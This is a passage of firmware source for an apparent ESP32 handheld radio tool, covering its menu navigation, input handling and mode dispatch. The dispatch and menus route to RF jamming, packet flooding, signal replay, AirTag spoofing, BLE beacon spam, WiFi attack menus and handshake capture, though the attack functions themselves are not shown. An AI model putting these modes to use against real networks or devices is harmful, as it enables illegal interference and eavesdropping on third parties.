                     RF_SWEEP_GRAPH_W, RF_SWEEP_GRAPH_H, ILI9341_BLACK);
        tft.fillRect(RF_SWEEP_WATERFALL_X, RF_SWEEP_WATERFALL_Y,
                     RF_SWEEP_WATERFALL_W, RF_SWEEP_WATERFALL_H, ILI9341_BLACK);
        drawRFFooterLine(0, 272, "Live floor map  LEFT back");
        drawRFFooterLine(1, 286, "Shared SDR waterfall");
        ghzNoiseLastInfoChannel = -1;
        ghzNoiseLastInfoPercent = -1;
        ghzNoiseLastInfoPeak = -1;
        noiseFirstDraw = false;
    }

    render24GHzSpectrum(true, fullRedraw);

    int totalPercent = 0;
    int peakPercent = 0;
    for (int i = 0; i < CHANNEL_COUNT; i++) {
        int percent = (int)(noiseLevel[i] * 100.0f);
        totalPercent += percent;
        if (percent > peakPercent) {
            peakPercent = percent;
        }
    }
    int rawInfoPercent = totalPercent / CHANNEL_COUNT;
    int rawPeakPercent = peakPercent;
    if (ghzNoiseDisplayAverage < 0.0f) {
        ghzNoiseDisplayAverage = rawInfoPercent;
    } else {
        ghzNoiseDisplayAverage = (ghzNoiseDisplayAverage * 0.82f) + (rawInfoPercent * 0.18f);
    }
    if (ghzNoiseDisplayPeak < 0.0f) {
        ghzNoiseDisplayPeak = rawPeakPercent;
    } else {
        ghzNoiseDisplayPeak = (ghzNoiseDisplayPeak * 0.76f) + (rawPeakPercent * 0.24f);
    }
    int infoPercent = (int)(ghzNoiseDisplayAverage + 0.5f);
    peakPercent = (int)(ghzNoiseDisplayPeak + 0.5f);
    infoPercent = constrain(infoPercent, 0, 100);
    peakPercent = constrain(peakPercent, 0, 100);

    int scanPercent = constrain((int)(noiseLevel[constrain(scanChannel, 0, CHANNEL_COUNT - 1)] * 100.0f + 0.5f), 0, 100);

    if (ghzNoiseLastInfoChannel != scanChannel ||
        ghzNoiseLastInfoPercent != infoPercent ||
        ghzNoiseLastInfoPeak != peakPercent) {
        drawRFStatLine(74,
                       String("Sweep ") + String(scanChannel + 1),
                       String("Noise ") + String(scanPercent) + "%");
        drawRFStatLine(86,
                       String("Floor ") + String(infoPercent) + "%",
                       String("Peak ") + String(peakPercent) + "%");
        ghzNoiseLastInfoChannel = scanChannel;
        ghzNoiseLastInfoPercent = infoPercent;
        ghzNoiseLastInfoPeak = peakPercent;
    }

    draw24GHzWaterfall();
}

// ===== LOOP =====
void app_loop() {
    system_update();
    return;

    serviceSDCardState();
    serviceStaleScanData();

    // ===== NORMAL FLOW =====
    if (currentScreen == SCREEN_MAIN) {
        handleInput();
    }
    else if (currentScreen == SCREEN_SUBMENU) {
        handleSubMenuInput();

        // if submenu code just moved us into a tool, remember when
        if (currentScreen == SCREEN_TOOL && toolScreenEnteredAt == 0) {
            toolScreenEnteredAt = millis();
        }
    }
    else if (currentScreen == SCREEN_TOOL) {

        if (toolScreenEnteredAt == 0) {
            toolScreenEnteredAt = millis();
        }

        bool backPressed = (currentRadioMode == RADIO_24_ACTIVE ||
                            currentRadioMode == BLE_RADAR ||
                            currentRadioMode == BLE_SIGNAL_LOGGER ||
                            currentRadioMode == BLE_SIGNAL_LOGGER_PICK ||
                            currentRadioMode == RF_ROLLING_CAPTURE ||
                            currentRadioMode == RF_SQUELCH_ACTIVATE ||
                            currentRadioMode == RF_FREQUENCY_SWEEP)
            ? (digitalRead(BTN_LEFT) == LOW)
            : isPressed(BTN_LEFT);
        if (rfShouldSuppressGlobalBack(currentRadioMode)) {
            backPressed = false;
        }

        if (millis() - toolScreenEnteredAt > 140 &&
            currentRadioMode == BLE_SIGNAL_LOGGER &&
            backPressed) {

            currentRadioMode = BLE_SIGNAL_LOGGER_PICK;
            bleScannerFirstDraw = true;
            bleNeedsRedraw = true;
            bleSelectedIndex = max(0, bleLoggerTargetIndex);
            bleScrollOffset = 0;
            tft.fillScreen(ILI9341_BLACK);
            drawStatusBar();
            delay(140);
            return;
        }

        // ===== GLOBAL BACK (guarded briefly after entering tool) =====
        if (millis() - toolScreenEnteredAt > 180 && backPressed) {
            LOG_IF(DEBUG_VERBOSE_UI, "GLOBAL BACK");
            navigateBack();
            toolScreenEnteredAt = 0;
            delay(150);
            return;
        }

        handleToolInput();

        if (toolBlockedScreenActive) {
            if (shouldRedraw) {
                drawToolBlockedScreen(getRadioModeLabel((RadioMode)toolBlockedMode),
                                      getToolBlockedReasonText(toolBlockedReasonCode),
                                      "Use Settings -> System for health");
                shouldRedraw = false;
            }
            delay(20);
            return;
        }

        if (currentRadioMode == RADIO_24_SCAN) {
            run24GHzScannerStep();
            drawTopScanner();
            drawScannerInfo();
            draw24GHzWaterfall();
            delay(40);
        }
        else if (currentRadioMode == RADIO_NOISE_ANALYZER) {
            runNoiseAnalyzerStep();
            drawNoiseAnalyzer();
            delay(30);
        }
        else if (currentRadioMode == RADIO_24_ACTIVE) {
            handleRFProtocols();
            drawRadio24ActiveScreen();
            delay(10);
        }
        else if (currentRadioMode == RADIO_24_PROTOCOL_ANALYZER) {
            runProtocolAnalyzer();
            delay(20);
        }
        else if (currentRadioMode == RADIO_24_PACKET_FLOOD) {
            runPacketFlooder();
        }
        else if (currentRadioMode == RF_SCANNER) {
            runRFScanner();
            delay(24);
        }
        else if (currentRadioMode == RF_MONITOR) {
            runRFMonitor();
            delay(24);
        }
        else if (currentRadioMode == RF_JAMMER) {
            Serial.println("[LOOP] Calling runRFJammer()");
            runRFJammer();
            delay(24);
        }
        else if (currentRadioMode == RF_SQUELCH_ACTIVATE) {
            runRFSquelchActivate();
            delay(24);
        }
        else if (currentRadioMode == RF_SIGNAL_CAPTURE) {
            runRFSignalCapture();
            delay(24);
        }
        else if (currentRadioMode == RF_FREQUENCY_SWEEP) {
            runRFSweep();
            delay(2);
        }
        else if (currentRadioMode == RF_ROLLING_CAPTURE) {
            runRollingCapture();
            delay(10);
        }
        else if (currentRadioMode == RF_TRANSMIT) {
            runRFTransmit();
            delay(4);
        }
        else if (currentRadioMode == RF_REPLAY) {
            runRFReplay();
            delay(12);
        }
        else if (currentRadioMode == WIFI_HIDDEN_SSID_REVEAL) {
            runHiddenSSIDReveal();
        }
        else if (currentRadioMode == BLE_AIRTAG_SPOOF) {
            runAirTagSpoof();
        }
        else if (currentRadioMode == WIFI_SCAN) {

            handleWiFiScannerInput();  // 🔥 ADD THIS
            runWiFiScanner();
        }
        else if (currentRadioMode == WIFI_PACKET_MONITOR) {
            runPacketMonitor();
        }
        else if (currentRadioMode == WIFI_BEACON) {
            runWiFiBeacon();
        }
        else if (currentRadioMode == WIFI_PROBE_SNIFF) {
            runProbeSniff();
        }
        else if (currentRadioMode == WIFI_BEACON_SNIFF) {
            runBeaconSniff();
        }
        else if (currentRadioMode == WIFI_DEAUTH_SNIFF) {
            runDeauthSniff();
        }
        else if (currentRadioMode == WIFI_EAPOL_SCAN) {
            runEapolScan();
        }
        else if (currentRadioMode == WIFI_RAW_CAPTURE) {
            runRawCapture();
        }
        else if (currentRadioMode == WIFI_STATION_SNIFF) {
            runStationSniff();
        }
        else if (currentRadioMode == WIFI_SIGNAL_MONITOR) {
            runSignalMonitor();
        }
        else if (currentRadioMode == WIFI_CHANNEL_ANALYZER) {
            runChannelAnalyzer();
        }
        else if (currentRadioMode == WIFI_PACKET_COUNT) {
            runPacketCount();
        }
        else if (currentRadioMode == WIFI_SCAN_ALL) {
            runScanAll();
        }
        else if (currentRadioMode == BLE_SCAN) {

            handleBLEScannerInput();
            if (currentRadioMode != BLE_SCAN || currentScreen != SCREEN_TOOL) {
                delay(20);
                return;
            }
            runBLEScanner();

            if (bleScanWorkerActive && bleScanTaskHandle == NULL) {
                setBLEScanStatus("Stopping old scan");
                bleNeedsRedraw = true;
                delay(20);
                return;
            }

            if (bleScanRunning && bleScanTaskHandle == NULL) {
                if (radioModeTransitionActive()) {
                    setBLEScanStatus("Switching radio");
                    bleNeedsRedraw = true;
                    delay(20);
                    return;
                }

                if (shouldRunBLEScanInline()) {
                    runBLEScan();
                    return;
                }

                BaseType_t taskOk = xTaskCreatePinnedToCore(
                    bleScanTask,
                    "BLEScanTask",
                    8192,
                    NULL,
                    1,
                    &bleScanTaskHandle,
                    0
                );

                if (taskOk != pdPASS) {
                    LOG("BLE ERROR: task create failed");
                    bleScanRunning = false;
                    setBLEScanStatus("Scan task failed", true);
                    markToolInitFailure(BLE_SCAN, "BLE task failed", 6000UL);
                    bleNeedsRedraw = true;
                    radioLocked = false;
                    bleScanTaskHandle = NULL;
                }
            }
        }
        else if (currentRadioMode == BLE_SIGNAL_LOGGER_PICK) {

            handleBLELoggerPickerInput();
            if (currentRadioMode != BLE_SIGNAL_LOGGER_PICK || currentScreen != SCREEN_TOOL) {
                delay(20);
                return;
            }
            runBLELoggerPicker();

            if (bleScanWorkerActive && bleScanTaskHandle == NULL) {
                setBLEScanStatus("Stopping old scan");
                bleNeedsRedraw = true;
                delay(20);
                return;
            }

            if (bleScanRunning && bleScanTaskHandle == NULL) {
                if (radioModeTransitionActive()) {
                    setBLEScanStatus("Switching radio");
                    bleNeedsRedraw = true;
                    delay(20);
                    return;
                }

                if (shouldRunBLEScanInline()) {
                    runBLEScan();
                    return;
                }

                BaseType_t taskOk = xTaskCreatePinnedToCore(
                    bleScanTask,
                    "BLEScanTask",
                    8192,
                    NULL,
                    1,
                    &bleScanTaskHandle,
                    0
                );

                if (taskOk != pdPASS) {
                    LOG("BLE ERROR: task create failed");
                    bleScanRunning = false;
                    setBLEScanStatus("Scan task failed", true);
                    bleNeedsRedraw = true;
                    radioLocked = false;
                    bleScanTaskHandle = NULL;
                }
            }
        }
        else if (currentRadioMode == BLE_BEACON_SPAM) {
            runBLEBeaconSpammer();
            delay(20);
        }
        else if (currentRadioMode == BLE_BEACON_TEST) {
            runBLEBeaconTest();
            delay(30);
        }
        else if (currentRadioMode == BLE_DEVICE_STABLE) {
            runBLEStableDevice();
            delay(30);
        }
        else if (currentRadioMode == BLE_RADAR) {
            runBLERadar();
            delay(20);
        }
        else if (currentRadioMode == BLE_SIGNAL_LOGGER) {
            runBLELogger();
            delay(20);
        }
        else {
            tft.fillScreen(ILI9341_BLACK);
            drawStatusBar();
            tft.setCursor(10, 30);
            tft.setTextSize(2);
            tft.setTextColor(ILI9341_RED);
            tft.print("No tool mode");
        }
    }
    else if (currentScreen == SCREEN_WIFI_DETAIL) {

        if (isPressed(BTN_LEFT)) {
            navigateBack();
            delay(150);
            return;
        }

        drawWiFiDetail();
        delay(100);  // Throttle to prevent excessive redraws
    }
    else if (currentScreen == SCREEN_BLE_DETAIL) {

        if (isPressed(BTN_LEFT)) {
            navigateBack();
            delay(150);
            return;
        }
        // drawBLEDetail is called once on entry — don't call it in the loop
        // (the OUI lookup runs on first call, subsequent calls are no-ops via detailDrawn flag)
        delay(100);
    }
    else if (currentScreen == SCREEN_SYSTEM_INFO) {

        if (infoScreenEnteredAt == 0) infoScreenEnteredAt = millis();
        handleSystemInfoInput();

        if (millis() - infoScreenEnteredAt > 300) {
            if (digitalRead(BTN_LEFT) == LOW) {
                navigateBack();
                infoScreenEnteredAt = 0;
                delay(200);
                return;
            }
        }
        static unsigned long lastSystemInfoRefresh = 0;
        if (millis() - lastSystemInfoRefresh >= 1200UL) {
            drawSystemInfoScreen();
            lastSystemInfoRefresh = millis();
        }
        delay(50);
    }
    else if (currentScreen == SCREEN_STORAGE_SETTINGS) {

        if (infoScreenEnteredAt == 0) infoScreenEnteredAt = millis();

        if (millis() - infoScreenEnteredAt > 300) {
            if (digitalRead(BTN_LEFT) == LOW) {
                navigateBack();
                infoScreenEnteredAt = 0;
                delay(200);
                return;
            }
        }
        delay(50);
    }
    else if (currentScreen == SCREEN_SD_FORMAT_CONFIRM) {
        handleSDFormatConfirmInput();
    }
    else if (currentScreen == SCREEN_FILE_MANAGER) {
        handleFileManagerInput();
        if (currentScreen == SCREEN_FILE_MANAGER) {
            drawFileManager();
        }
    }
    else if (currentScreen == SCREEN_FILE_DETAIL) {
        handleFileDetailInput();
    }
    else if (currentScreen == SCREEN_FILE_DELETE_CONFIRM) {
        handleFileDeleteConfirmInput();
    }
    else if (currentScreen == SCREEN_FILE_RENAME) {
        handleFileRenameInput();
    }
    else {
        toolScreenEnteredAt = 0;
        infoScreenEnteredAt = 0;
    }
}

// ===== BUTTON PRESS =====
bool isPressed(int pin) {
    static unsigned long lastPressTime[5] = {0}; // Reduced from 40 to save 140 bytes RAM
    int pinIndex = pin % 5; // Map pin to array index

    if (screenSaverWakeReleaseRequired) {
        if (allNavigationButtonsReleased()) {
            screenSaverWakeReleaseRequired = false;
        }
        return false;
    }

    if (pin == BTN_SELECT && selectReleaseRequired) {
        if (companion_readButtonState(pin) == HIGH) {
            selectReleaseRequired = false;
        }
        return false;
    }

    if (companion_readButtonState(pin) == LOW) {
        unsigned long now = millis();
        lastUserInteractionMs = now;
        if (now - lastPressTime[pinIndex] > BUTTON_DEBOUNCE_MS) {
            lastPressTime[pinIndex] = now;
            return true;
        }
    }

    return false;
}

// ===== MAIN INPUT =====
void handleInput() {
    int prevIndex = selectedIndex;

    if (isPressed(BTN_UP)) {
        selectedIndex -= 2;
        if (selectedIndex < 0) selectedIndex = totalItems - 1;
    }

    if (isPressed(BTN_DOWN)) {
        selectedIndex += 2;
        if (selectedIndex >= totalItems) selectedIndex = 0;
    }

    if (isPressed(BTN_RIGHT)) {
        if (selectedIndex % 2 == 0 && selectedIndex + 1 < totalItems) selectedIndex++;
    }

    if (isPressed(BTN_LEFT)) {
        if (selectedIndex % 2 == 1) {
            selectedIndex--;
        }
    }

    if (prevIndex != selectedIndex) {
        redrawTileByIndex(prevIndex, false);
        redrawTileByIndex(selectedIndex, true);
    }

    if (isPressed(BTN_SELECT)) {

        switch (selectedIndex) {
            case 0:
                currentMenu = wifiMenu;
                currentMenuSize = sizeof(wifiMenu) / sizeof(wifiMenu[0]);
                currentTitle = "WiFi";
                break;

            case 1:
                currentMenu = bluetoothMenu;
                currentMenuSize = sizeof(bluetoothMenu) / sizeof(bluetoothMenu[0]);
                currentTitle = "Bluetooth";
                break;

            case 2:
                currentMenu = ghzMenu;
                currentMenuSize = sizeof(ghzMenu) / sizeof(ghzMenu[0]);
                currentTitle = "2.4GHz";
                break;

            case 3:
                currentMenu = rfMenu;
                currentMenuSize = sizeof(rfMenu) / sizeof(rfMenu[0]);
                currentTitle = "RF";
                break;

            case 4:
                currentMenu = settingsMenu;
                currentMenuSize = sizeof(settingsMenu) / sizeof(settingsMenu[0]);
                currentTitle = "Settings";
                submenuParentMenu = nullptr;
                submenuParentSize = 0;
                submenuParentIndex = 0;
                submenuParentScrollOffset = 0;
                submenuParentTitle = "";
                break;

            case 5:
                currentTitle = "Files";
                fileManagerPath = "/";
                currentScreen = SCREEN_FILE_MANAGER;
                tft.fillScreen(ILI9341_BLACK);
                drawStatusBar();
                loadFileManagerEntries();
                fileManagerNeedsRedraw = true;
                drawFileManager();
                delay(120);
                return;
        }

        currentMenuIndex = 0;
        currentMenuScrollOffset = 0;

        if (currentMenu == settingsMenu && isMenuItemDisabled(currentMenuIndex)) {
            moveToNextSelectable(1);
        }

        currentScreen = SCREEN_SUBMENU;
        drawSubMenu();

        delay(120);
    }
}

// ===== SUBMENU ICON ARRAY LOOKUP =====
const char** getCurrentIconArray() {
    if (currentMenu == wifiMenu) return wifiIcons;
    if (currentMenu == wifiSniffersMenu) return wifiSniffersIcons;
    if (currentMenu == wifiAttacksMenu) return wifiAttacksIcons;
    if (currentMenu == bluetoothMenu) return bluetoothIcons;
    if (currentMenu == bleAttacksMenu) return bleAttacksIcons;
    if (currentMenu == bluetoothSniffersMenu) return bluetoothSniffersIcons;
    if (currentMenu == bluetoothManufacturerMenu) return bluetoothManufacturerIcons;
    if (currentMenu == ghzMenu) return ghzIcons;
    if (currentMenu == ghzSniffersMenu) return ghzSniffersIcons;
    if (currentMenu == ghzAttacksMenu) return ghzAttacksIcons;
    if (currentMenu == rfMenu) return rfIcons;
    if (currentMenu == rfSniffersMenu) return rfSniffersIcons;
    if (currentMenu == rfTransmitMenu) return rfTransmitIcons;
    if (currentMenu == settingsMenu) return settingsIcons;
    if (currentMenu == storageSettingsMenu) return storageSettingsIcons;
    if (currentMenu == wifiSettingsMenu) return wifiSettingsIcons;
    if (currentMenu == screenSaverMenu) return screenSaverIcons;
    if (currentMenu == brightnessMenu) return brightnessIcons;
    return nullptr;
}

bool currentMenuHasIcons() {
    return getCurrentIconArray() != nullptr;
}

bool isMenuItemDisabled(int index) {
    if (currentMenu == settingsMenu) {
        // WiFi Settings disabled if SD not mounted (index 0)
        if (index == 0 && (!sdMounted || sdError)) return true;

#if TFT_BACKLIGHT_PIN < 0
        // Brightness disabled if no backlight pin
        if (index == 3) return true;
#endif
        return false;
    }
    
    if (currentMenu == storageSettingsMenu) {
        // Mount SD disabled if already mounted successfully (index 1)
        if (index == 1 && sdMounted && !sdError) return true;

        // Unmount SD disabled if not mounted successfully (index 2)
        if (index == 2 && (!sdMounted || sdError)) return true;

        // Format SD disabled if not mounted successfully (index 3)
        if (index == 3 && (!sdMounted || sdError)) return true;

        return false;
    }

    return false;
}

void moveToNextSelectable(int dir) {
    if (currentMenu == nullptr || currentMenuSize <= 0) return;

    int tries = 0;
    while (tries < currentMenuSize) {
        currentMenuIndex += dir;

        if (currentMenuIndex < 0) currentMenuIndex = currentMenuSize - 1;
        if (currentMenuIndex >= currentMenuSize) currentMenuIndex = 0;

        if (!isMenuItemDisabled(currentMenuIndex)) {
            return;
        }

        tries++;
    }
}

// ===== SUBMENU INPUT =====
void handleSubMenuInput() {

    int prevIndex = currentMenuIndex;
    int previousScrollOffset = currentMenuScrollOffset;

    if (isPressed(BTN_LEFT)) {
            LOG_IF(DEBUG_VERBOSE_UI, "SUBMENU BACK");
        navigateBack();
        delay(150);
        return;
    }

    if (isPressed(BTN_UP)) moveToNextSelectable(-1);
    if (isPressed(BTN_DOWN)) moveToNextSelectable(1);

    if (prevIndex != currentMenuIndex) {
        int visibleItems = min(currentMenuSize, 6);
        if (currentMenuSize <= visibleItems) {
            currentMenuScrollOffset = 0;
        } else {
            if (currentMenuIndex < currentMenuScrollOffset) {
                currentMenuScrollOffset = currentMenuIndex;
            }
            if (currentMenuIndex >= currentMenuScrollOffset + visibleItems) {
                currentMenuScrollOffset = currentMenuIndex - visibleItems + 1;
            }
        }

        if (previousScrollOffset != currentMenuScrollOffset) {
            drawSubMenu();
        } else {
            drawSubMenuItem(prevIndex, false);
            drawSubMenuItem(currentMenuIndex, true);
        }
    }

    if (isPressed(BTN_SELECT)) {

        // ===== BACK =====
        if (currentMenuIndex == currentMenuSize - 1) {
                LOG_IF(DEBUG_VERBOSE_UI, "Submenu Back");
            navigateBack();
            delay(150);
            return;
        }

        activeToolIndex = currentMenuIndex;

        // ===== SETTINGS =====
        if (currentMenu == settingsMenu) {

            if (currentMenuIndex == 0) {
                // WiFi Settings submenu
                submenuParentMenu = settingsMenu;
                submenuParentSize = currentMenuSize;
                submenuParentIndex = currentMenuIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "Settings";
                currentMenu = wifiSettingsMenu;
                currentMenuSize = sizeof(wifiSettingsMenu) / sizeof(wifiSettingsMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "WiFi Settings";
                drawSubMenu();
                delay(150);
                return;
            }
            else if (currentMenuIndex == 1) {
                // Storage Settings submenu
                submenuParentMenu = settingsMenu;
                submenuParentSize = currentMenuSize;
                submenuParentIndex = currentMenuIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "Settings";
                currentMenu = storageSettingsMenu;
                currentMenuSize = sizeof(storageSettingsMenu) / sizeof(storageSettingsMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "Storage";
                drawSubMenu();
                delay(150);
                return;
            }
            else if (currentMenuIndex == 2) {
                // Screensaver submenu
                submenuParentMenu = settingsMenu;
                submenuParentSize = currentMenuSize;
                submenuParentIndex = currentMenuIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "Settings";
                currentMenu = screenSaverMenu;
                currentMenuSize = sizeof(screenSaverMenu) / sizeof(screenSaverMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "Screen Saver";
                drawSubMenu();
                delay(150);
                return;
            }
            else if (currentMenuIndex == 3) {
                // Brightness submenu
                submenuParentMenu = settingsMenu;
                submenuParentSize = currentMenuSize;
                submenuParentIndex = currentMenuIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "Settings";
                currentMenu = brightnessMenu;
                currentMenuSize = sizeof(brightnessMenu) / sizeof(brightnessMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "Brightness";
                drawSubMenu();
                delay(150);
                return;
            }
            else if (currentMenuIndex == 4) {
                // OTA Update
                if (startWirelessUpdate()) {
                    delay(150);
                }
                return;
            }
            else if (currentMenuIndex == 5) {
                // System Info
                currentTitle = "System";
                infoScreenEnteredAt = 0;
                currentScreen = SCREEN_SYSTEM_INFO;
                drawSystemInfoScreen();
                delay(200);
                return;
            }
            else if (currentMenuIndex == 6) {
                // Reboot
                tft.fillScreen(ILI9341_BLACK);
                drawStatusBar();

                tft.setTextSize(2);
                tft.setCursor(60, 120);
                tft.print("Rebooting...");

                delay(400);
                ESP.restart();
                return;
            }
        }

        if (currentMenu == storageSettingsMenu) {
            if (currentMenuIndex == 0) {
                // SD Info screen
                infoScreenEnteredAt = 0;
                storageInfoNeedsRedraw = true;
                currentScreen = SCREEN_STORAGE_SETTINGS;
                drawStorageSettingsScreen();
                delay(150);
                return;
            }
            else if (currentMenuIndex == 1 && !isMenuItemDisabled(currentMenuIndex)) {
                // Mount SD
                sdAutoMountRetryBlocked = false;
                sdError = false;
                mountSD(true, true, false, "MANUAL_MOUNT");
                return;
            }
            else if (currentMenuIndex == 2 && !isMenuItemDisabled(currentMenuIndex)) {
                // Unmount SD
                unmountSD();
                return;
            }
            else if (currentMenuIndex == 3 && !isMenuItemDisabled(currentMenuIndex)) {
                // Format SD
                sdFormatConfirmEraseSelected = true;
                LOG("FORMAT confirm open");
                currentScreen = SCREEN_SD_FORMAT_CONFIRM;
                drawSDFormatConfirmScreen();
                delay(150);
                return;
            }
        }

        if (currentMenu == wifiSettingsMenu) {
            if (currentMenuIndex == 0) {
                // Select EP HTML File - Open file manager filtered for HTML
                fileManagerPath = "/";
                fileManagerSelectedIndex = 0;
                fileManagerScrollOffset = 0;
                fileManagerNeedsRedraw = true;
                fileManagerSelectMode = true;  // Enable selection mode for HTML
                fileManagerSelectFilter = ".html";  // Filter for HTML files
                currentScreen = SCREEN_FILE_MANAGER;
                loadFileManagerEntries();
                drawFileManager();
                delay(150);
                return;
            }
            else if (currentMenuIndex == 1) {
                // Rename EP AP - Open keyboard screen
                epRenameDraft = String(epAPName);
                epRenameCursor = 0;
                epRenameUppercase = false;
                epRenameJustEntered = true; // Set flag to reset prevCursor
                currentScreen = SCREEN_EP_RENAME;
                drawEPRenameScreen();
                delay(150);
                return;
            }
        }

        if (currentMenu == screenSaverMenu) {
            if (currentMenuIndex == 0) {
                screenSaverTimeoutIndex = (screenSaverTimeoutIndex + 1) % screenSaverTimeoutCount;
                persistScreenSaverSettings();
                lastUserInteractionMs = millis();
                drawSubMenu();
                delay(150);
                return;
            }
            else if (currentMenuIndex == 1) {
                screenSaverStyleIndex = (screenSaverStyleIndex + 1) % screenSaverStyleCount;
                persistScreenSaverSettings();
                lastUserInteractionMs = millis();
                drawSubMenu();
                delay(150);
                return;
            }
        }

        if (currentMenu == brightnessMenu) {
            if (currentMenuIndex == 0) {
#if TFT_BACKLIGHT_PIN >= 0
                tftBrightnessStepIndex = (tftBrightnessStepIndex + 1) % tftBrightnessStepCount;
                applyTftBacklightDuty(tftBrightnessDutySteps[tftBrightnessStepIndex]);
                persistTftBrightness();
#endif
                lastUserInteractionMs = millis();
                drawSubMenu();
                delay(150);
                return;
            }
        }

        // ===== DEFAULT =====
        stopCurrentRadioMode();
        resetAllToolAndUIState(false);

        // ===== WIFI TOP-LEVEL =====
        if (currentMenu == wifiMenu) {
            if (activeToolIndex == 0) {
                // Enter WiFi Sniffers submenu
                submenuParentMenu = wifiMenu;
                submenuParentSize = sizeof(wifiMenu) / sizeof(wifiMenu[0]);
                submenuParentIndex = activeToolIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "WiFi";
                currentMenu = wifiSniffersMenu;
                currentMenuSize = sizeof(wifiSniffersMenu) / sizeof(wifiSniffersMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "WiFi Sniffers";
                drawSubMenu();
                return;
            }
            else if (activeToolIndex == 1) {
                // Enter WiFi Attacks submenu
                submenuParentMenu = wifiMenu;
                submenuParentSize = sizeof(wifiMenu) / sizeof(wifiMenu[0]);
                submenuParentIndex = activeToolIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "WiFi";
                currentMenu = wifiAttacksMenu;
                currentMenuSize = sizeof(wifiAttacksMenu) / sizeof(wifiAttacksMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "WiFi Attacks";
                drawSubMenu();
                return;
            }
        }

        // ===== WIFI SNIFFERS =====
        else if (currentMenu == wifiSniffersMenu) {
            // helper macro to start promiscuous sniff
            auto startSniff = [&]() {
                sniffBufCount = 0; sniffScrollOffset = 0; sniffListNeedsRedraw = true;
                wifiScannerFirstDraw = true;
                lastScanAnim = 0;
                scanDots = 1;
                wifiScanKeepStatusUntil = millis() + 1600UL;
                resetWiFi();
                if (WiFi.mode(WIFI_STA)) {
                    // Set MAXIMUM WiFi power for maximum range and better reception
                    esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
                    
                    // Catch ALL frame types — mgmt, data, ctrl, misc
                    wifi_promiscuous_filter_t filt;
                    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
                    esp_wifi_set_promiscuous_filter(&filt);
                    esp_wifi_set_promiscuous(true);
                    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_extended);
                    packetCount = 0;
                } else { wifiInitRetryAt = millis() + 1500UL; }
            };

            if (activeToolIndex == 0) { enterMode(WIFI_PROBE_SNIFF);      startSniff(); }
            else if (activeToolIndex == 1) { enterMode(WIFI_BEACON_SNIFF);    startSniff(); }
            else if (activeToolIndex == 2) { enterMode(WIFI_DEAUTH_SNIFF);    startSniff(); }
            else if (activeToolIndex == 3) { enterMode(WIFI_EAPOL_SCAN);      startSniff(); }
            else if (activeToolIndex == 4) { enterMode(WIFI_RAW_CAPTURE);     startSniff(); }
            else if (activeToolIndex == 5) { enterMode(WIFI_STATION_SNIFF);   startSniff(); }
            else if (activeToolIndex == 6) {
                enterMode(WIFI_SIGNAL_MONITOR);
                sigMonFirstDraw = true;
                wifiSnifferHopChannel = 1;
                wifiSnifferLastHop = 0;
                wifiSnifferStrongestChannel = 1;
                wifiSnifferStrongestRssi = -95;
                for (int ch = 0; ch < 14; ch++) sigMonRssi[ch] = -95;
                startSniff();
            }
            else if (activeToolIndex == 7) {
                enterMode(WIFI_CHANNEL_ANALYZER);
                wifiPacketFirstDraw = true;
                wifiSnifferHopChannel = 1;
                wifiSnifferLastHop = 0;
                for (int ch = 0; ch < 14; ch++) {
                    channelPower[ch] = 0;
                    smoothedPower[ch] = 0;
                }
                startSniff();
            }
            else if (activeToolIndex == 8) { enterMode(WIFI_SCAN_ALL);        startSniff(); }
            else if (activeToolIndex == 9) {
                enterMode(WIFI_PACKET_COUNT);
                pktCountMgmt = 0; pktCountData = 0; pktCountCtrl = 0;
                pktCountFirstDraw = true;
                resetWiFi();
                if (WiFi.mode(WIFI_STA)) {
                    // Set MAXIMUM WiFi power for maximum range and better reception
                    esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
                    
                    esp_wifi_set_promiscuous(true);
                    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_extended);
                    packetCount = 0;
                } else { wifiInitRetryAt = millis() + 1500UL; }
            }
            else if (activeToolIndex == 10) {
                // Packet Monitor (moved from WiFi Tools)
                enterMode(WIFI_PACKET_MONITOR);
                wifiPacketFirstDraw = true;
                resetWiFi();
                if (WiFi.mode(WIFI_STA)) {
                    wifiInitRetryAt = 0;
                    // Set MAXIMUM WiFi power for maximum range and better reception
                    esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
                    
                    esp_wifi_set_promiscuous(true);
                    esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_extended);
                    packetCount = 0;
                } else {
                    wifiInitRetryAt = millis() + 1500UL;
                    LOG("WiFi STA mode failed for packet monitor");
                    markToolInitFailure(WIFI_PACKET_MONITOR, "WiFi STA failed", 5000UL);
                }
            }
            else if (activeToolIndex == 11) {
                // Scan APs (moved from WiFi Tools)
                enterMode(WIFI_SCAN);
                clearWiFiScanResults();
                wifiSelectedIndex = 0;
                wifiScrollOffset = 0;
                wifiScanRunning = true;
                wifiScanReadyAt = millis() + 650UL;
                wifiScanKeepStatusUntil = millis() + 1600UL;
                wifiScanAutoRetryPending = true;
                wifiScanWarmupRetries = 2;
                setWiFiScanStatus("Queueing scan");
                wifiScannerFirstDraw = true;
                lastScanAnim = 0;
                scanDots = 1;
                tft.fillScreen(ILI9341_BLACK);
                drawStatusBar(); // Draw status bar so it's visible during scan
                wifiNeedsRedraw = true;
            }
            else if (activeToolIndex == 12) {
                LOG(">>> HIDDEN SSID SNIFF <<<");
                enterMode(WIFI_HIDDEN_SSID_REVEAL);
                attackFirstDraw = true;
                sniffBufCount = 0;
